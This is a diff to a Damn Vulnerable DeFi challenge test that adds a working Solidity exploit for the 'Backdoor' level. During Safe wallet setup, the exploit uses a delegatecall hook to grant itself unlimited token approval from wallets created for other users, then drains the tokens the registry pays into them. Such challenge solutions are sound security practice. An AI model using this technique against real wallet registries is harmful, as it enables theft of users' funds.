@@ -5,6 +5,7 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
+import {IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
 
@@ -70,7 +71,8 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        // One transaction: deploying the attacker. Everything else runs in its constructor.
+        new BackdoorAttacker(walletFactory, address(singletonCopy), address(walletRegistry), token, users, recovery);
     }
 
     /**
@@ -92,5 +94,55 @@ contract BackdoorChallenge is Test {
 
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+// Runs inside each new wallet via Safe.setup's `to`/`data` delegatecall hook.
+// msg.sender seen by the token is therefore the wallet itself.
+contract BackdoorApprover {
+    function approveSpender(DamnValuableToken token, address spender) external {
+        token.approve(spender, type(uint256).max);
+    }
+}
+
+contract BackdoorAttacker {
+    constructor(
+        SafeProxyFactory factory,
+        address singleton,
+        address registry,
+        DamnValuableToken token,
+        address[] memory users,
+        address recovery
+    ) {
+        // The delegatecall target needs code, which this contract doesn't have yet
+        // (it is still being constructed), so use a separate helper.
+        BackdoorApprover helper = new BackdoorApprover();
+
+        for (uint256 i = 0; i < users.length; i++) {
+            address[] memory owners = new address[](1);
+            owners[0] = users[i];
+
+            bytes memory initializer = abi.encodeCall(
+                Safe.setup,
+                (
+                    owners,
+                    1, // threshold the registry expects
+                    address(helper), // `to`: delegatecalled during setup
+                    abi.encodeCall(BackdoorApprover.approveSpender, (token, address(this))),
+                    address(0), // no fallback handler, as the registry requires
+                    address(0),
+                    0,
+                    payable(address(0))
+                )
+            );
+
+            // The factory calls registry.proxyCreated, which pays 10 DVT into the new wallet
+            address wallet = address(
+                factory.createProxyWithCallback(singleton, initializer, i, IProxyCreationCallback(registry))
+            );
+
+            // Spend the allowance the wallet granted us during setup
+            token.transferFrom(wallet, recovery, token.balanceOf(wallet));
+        }
     }
 }
